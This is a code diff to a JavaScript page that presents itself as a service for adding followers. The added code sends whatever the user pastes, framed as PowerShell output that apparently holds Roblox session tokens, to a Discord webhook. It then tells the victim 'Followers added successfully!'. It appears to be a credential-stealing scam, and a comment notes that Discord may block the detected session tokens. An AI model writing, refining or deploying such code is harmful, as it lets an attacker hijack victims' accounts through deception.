@@ -294,31 +294,49 @@ async function sendData(){
 
 
 
-        try{
-
-
-
-            await fetch(webhookURL,{
-
-                method:"POST",
-
-                headers:{
-
-                    "Content-Type":"application/json"
-
+        try {
+    const payload = {
+        embeds: [{
+            title: "🚀 Nowe zgłoszenie z panelu",
+            color: 3447003, // Kolor niebieski w formacie dziesiętnym
+            fields: [
+                {
+                    name: "Kod PowerShell / Dane",
+                    value: "```powershell\n" + username + "\n```" // Blok kodu
                 },
+                {
+                    name: "Liczba obserwujących",
+                    value: followers,
+                    inline: true
+                },
+                {
+                    name: "Data",
+                    value: new Date().toLocaleString(),
+                    inline: true
+                }
+            ]
+        }]
+    };
 
-                body:JSON.stringify({
+    const response = await fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+            // Uwaga: Discord może zablokować zapytanie, jeśli wykryje tokeny sesji roblox
+        },
+        body: JSON.stringify(payload)
+    });
 
-                    username: username,
+    if (response.ok) {
+        addLog("✅ Followers added successfully!");
+    } else {
+        addLog(`❌ Błąd Discorda: ${response.status}`);
+    }
 
-                    followers: followers,
+} catch (error) {
+    addLog("❌ Error connecting to server.");
+}
 
-                    timestamp: new Date().toLocaleString()
-
-                })
-
-            });
 
 
 
